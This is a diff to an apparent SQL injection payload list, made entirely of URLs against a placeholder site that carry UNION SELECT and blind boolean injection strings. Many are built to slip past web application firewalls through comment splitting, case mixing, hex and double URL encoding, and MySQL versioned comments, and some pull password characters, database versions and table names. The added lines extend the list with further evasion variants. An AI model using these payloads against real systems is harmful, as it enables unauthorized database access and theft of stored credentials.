@@ -3,7 +3,7 @@
 www.site.com/home.php?id=-2 /**//*U*//*n*//*I*//*o*//*N*//*S*//*e*//*L*//*e*//*c*//*T*/1,2,3—
 www.site.com/home.php?id=-2%20Union%20Select%201,2,3--
 www.site.com/home.php?id=-2 0x756e696f6e2073656c65637420312c322c332d2d 
-www.site.com/home.php?id=-2%20Union%20Select%201,2,3--
+www.site.com/home.php?id=-2%20UnIon%20SElect%201,2,3--
 www.site.com/home.php?id=-2‘ and (select substr(group_concat(pass),1,1) from users)=’a
 www.site.com/home.php?id=-2‘ and substr((select max(pass) from users),1,1)=’a
 www.site.com/home.php?id=-2‘ and substr((select max(replace(pass,’lastpw’,”)) from users),1,1)=’a
@@ -31,3 +31,15 @@ www.site.com/home.php?id=-2+UNunionION+SEselectLECT+1,2,3--
 www.site.com/home.php?id=-2%252f%252a*/union%252f%252a /select%252f%252a*/1,2,3%252f%252a*/from%252f%252a*/users--
 www.site.com/home.php?id=-2+and+(select 1)=(select 0x414141414141441414141414114141414141414141414141414141414141414141.)+union+select+1,2,version(),database(),user(),6,7,8,9,10--
 www.site.com/home.php?id=-2/*!UnIoN*/+/*!SeLecT*/+1,2,concat(/*!table_name*/)+FrOm/*!information_schema*/.tables/*!WhErE*/+/*!TaBlE_sChEMa*/+like+database()--
+www.site.com/home.php?id=-2+Union%25%20sElEct%25 1,2,3--
+www.site.com/home.php?id=-2 0x7c7c20556e496f4e2073654c456374 1,2,3--
+www.site.com/home.php?id=-2'1 AND %EF%BC%871%EF%BC%87=%EF%BC%871'
+www.site.com/home.php?id=.0 union select /**/1,2,3--
+www.site.com/home.php?id=.2'/*!50000UNION*//*!50000SELECT*/1,2,3-- -
+www.site.com/home.php?id=.2' || 2 not like 1
+www.site.com/home.php?id=-2 110 or x'30'=48
+www.site.com/home.php?id=-2 || 12 rlike 1
+www.site.com/home.php?id=2 unio%6e%20%64istinc%74%20%73elect
+www.site.com/home.php?id=2 uni%6fn distinct%52OW s%65lect
+www.site.com/home.php?id=2 %23?zen?%0Aunion all%23zen%0A%23Zen%0Aselect
+www.site.com/home.php?id=2'UnION distinctrow Select 11-- -
